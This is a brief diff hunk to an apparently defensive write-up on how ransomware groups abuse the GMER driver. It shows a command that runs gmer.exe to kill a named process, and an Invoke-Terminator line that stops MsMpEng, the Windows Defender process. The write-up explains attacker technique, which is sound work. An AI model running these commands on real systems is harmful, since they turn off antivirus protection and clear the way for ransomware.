@@ -35,6 +35,7 @@ Ransomware groups used GMER to terminate or disable antivirus processes, especia
 & "C:\path	o\gmer.exe" -kill "ProcessName"
 ```
 The below powershell script an example tool used to load gmer driver and use it kill different kind of software 
+
 ```https://github.com/xiosec/Terminator
 Invoke-Terminator -ServiceName terminator -ProcName MsMpEng 
 
